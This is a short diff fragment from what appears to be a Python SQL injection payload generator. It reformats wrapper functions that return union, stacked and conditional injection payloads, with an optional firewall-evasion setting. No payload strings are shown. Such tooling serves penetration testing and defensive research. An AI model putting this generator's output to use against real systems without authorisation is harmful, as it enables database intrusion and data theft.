         for p in generate("sqli", key, "all", waf_name):
             results.append(p["payload"])
     return results
 
 
-def generate_sqli_union(context: str = "string",
-                        waf_name: Optional[str] = None) -> List[str]:
+def generate_sqli_union(context: str = "string", waf_name: Optional[str] = None) -> List[str]:
     return [p["payload"] for p in generate("sqli", "union", context, waf_name)]
 
 
-def generate_sqli_stacked(context: str = "string",
-                          waf_name: Optional[str] = None) -> List[str]:
+def generate_sqli_stacked(context: str = "string", waf_name: Optional[str] = None) -> List[str]:
     return [p["payload"] for p in generate("sqli", "stacked", context, waf_name)]
 
 
-def generate_sqli_conditional(context: str = "string",
-                              waf_name: Optional[str] = None) -> List[str]:
+def generate_sqli_conditional(context: str = "string", waf_name: Optional[str] = None) -> List[str]:
     return [p["payload"] for p in generate("sqli", "conditional", context, waf_name)]
 
 
